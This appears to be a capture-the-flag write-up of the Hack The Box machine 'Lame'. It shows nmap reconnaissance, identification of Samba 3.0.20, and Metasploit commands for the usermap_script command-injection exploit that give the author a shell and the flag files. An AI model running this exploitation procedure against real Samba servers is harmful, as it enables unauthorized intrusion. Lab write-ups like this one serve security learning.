https://app.hackthebox.com/machines/1

We're firing up with an nmap:
# Nmap 7.91 scan initiated Tue Oct 26 11:25:22 2021 as: nmap -A -T4 -p- -o README.md 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.071s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h01m24s, deviation: 2h49m43s, median: 1m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-10-26T11:31:06-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   67.30 ms 10.10.14.1
2   69.34 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 26 11:30:22 2021 -- 1 IP address (1 host up) scanned in 299.94 seconds
	
	
The FTP server allowes anonymous login but doesn't seem to have anything accessible anonymously on it.
	
Moving on, seems that the server is running smb (samba).

We can try to use **smb_version** from the **Metasploit Framework** to get the version of the smb running on the server.
	
We can use the module like this: 
	
	*use auxiliary/scanner/smb/smb_version*
	
We only need to set the RHOSTS (remote host, the victim's IP): ***set RHOSTS 10.10.10.3*** and then run it.
	
Let's take a look at what it found: -   **Host could not be identified: Unix (Samba 3.0.20-Debian)**
	
So the Samba version seems to be 3.0.20. 
Time to google the version and see if there are any known vulnerabilities for it.
	
The first link we are given upon googling "samba version 3.0.20", is: https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
	
Description:
	
	#### Description

This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!
	
So this seems to be an OS injection. And looks like Metasploit has got us covered! 

msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show targets
    ...targets...
msf exploit(usermap_script) > set TARGET < target-id >
msf exploit(usermap_script) > show options
    ...show and set options...
msf exploit(usermap_script) > exploit

	
	
Sweet! We're in!
![[Pasted image 20211028061021.png]]
	
	
It looks like we are logged in as user "firefart".
	If we "ls", we can see there is the user.txt and we can access it!
	If we cd to root, there's also root.txt and we can cat it as well.
	That's it!
	![[Pasted image 20211028061203.png]]